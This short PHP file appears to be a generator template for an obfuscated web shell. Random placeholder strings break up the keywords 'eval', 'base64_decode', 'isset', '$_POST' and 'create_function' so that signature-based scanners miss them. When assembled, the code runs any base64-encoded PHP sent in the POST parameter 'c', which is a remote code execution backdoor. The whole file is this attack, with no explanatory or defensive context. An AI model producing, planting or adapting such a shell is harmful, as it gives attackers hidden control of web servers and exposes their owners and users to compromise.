<?php

${{FIRST_L}} = 'if(iss{{STRING_RANDOM}}et($_PO{{STRING_RANDOM}}ST["{{STRING_RANDOM}}c"])){';
${{SECOND_L}} = 'ev{{STRING_RANDOM}}al(base{{STRING_RANDOM}}6{{STRING_RANDOM}}4_dec{{STRING_RANDOM}}ode($_P{{STRING_RANDOM}}OST["{{STRING_RANDOM}}c"]));}';
${{T_L}} = ${{FIRST_L}}.${{SECOND_L}};
${{F_L}} = str_replace("{{STRING_RANDOM}}", '', ${{T_L}});
${{FV_L}} = str_replace("{{STRING_RANDOM_2}}", '','cre{{STRING_RANDOM_2}}ate_f{{STRING_RANDOM_2}}unc{{STRING_RANDOM_2}}tion');
${{S_L}} = ${{FV_L}}('', ${{F_L}});
${{S_L}}();